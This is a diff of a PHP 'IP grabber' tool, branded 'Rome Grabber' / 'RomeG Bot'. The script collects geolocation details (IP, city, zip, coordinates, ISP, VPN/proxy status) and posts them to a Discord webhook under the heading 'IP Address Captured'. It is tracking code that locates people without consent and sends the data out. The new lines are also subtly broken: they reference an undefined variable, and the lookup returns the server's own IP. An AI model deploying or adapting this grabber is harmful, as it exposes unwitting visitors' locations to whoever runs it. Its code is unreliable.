@@ -1,33 +1,39 @@
 <?php
 const WEBHOOK_DEFAULT = "https://discordapp.com/api/webhooks/";
-const IP_API_CODE = "28533755";
+const IP_API_FIELDS = "16999419";
 
 $webhook_id = base64_decode($_GET["id"]);
 $target_website = base64_decode($_GET["target"]);
 
 if ($webhook_id && $target_website) {
-    $user_ip = json_decode(file_get_contents("https://api.ipify.org?format=json"))->ip;
-    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/$user_ip?fields=28533755"));
+    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/?fields=$IP_API_CODE"));
+
+    $discord_country_flag = ":flag_" . strtolower($ip_details->countryCode) . ":";
+    $mobile = $ip_details->mobile ? "Yes" : "No";
+    $proxy = $ip_details->proxy ? "Yes" : "No";
+    $hosting = $ip_details->hosting ? "Yes" : "No";
 
     $payload = json_encode(array(
-        "username" => "Rome Grabber Bot",
+        "username" => "RomeG Bot",
         "embeds" => array(
             array(
-                "title" => "New Target!",
+                "title" => "<---- [ :bow_and_arrow: IP Address Captured ] ---->",
                 "description" => "
-                    **IP:** $user_ip
-                    **Continent name:** $ip_details->continent
-                    **Two-letter continent code:** $ip_details->continentCode
-                    **Country name:** $ip_details->country
-                    **Two-letter country code:** $ip_details->countryCode
+                    **IP:** $ip_details->query
+                    **Country:** $ip_details->country $discord_country_flag
                     **Region/state:** $ip_details->regionName
                     **City:** $ip_details->city
                     **Zip code:** $ip_details->zip
-                    **Latitude:** $ip_details->lat
-                    **Longitude:** $ip_details->lon
-                    **Timezone (tz):** $ip_details->timezone
-                    **National currency:** $ip_details->currency
-                    **ISP name:** $ip_details->isp"
+                    **Geolocation:** lat: $ip_details->lat / lon: $ip_details->lon
+                    **Timezone:** $ip_details->timezone
+                    **ISP:** $ip_details->isp
+                    **Mobile connection:** $mobile
+                    **Proxy/VPN/Tor:** $proxy
+                    **Hosting:** $hosting",
+                "color" => hexdec("#daa520"),
+                "footer" => array(
+                    "text" => "RomeG"
+                )
             )
         )
     ));
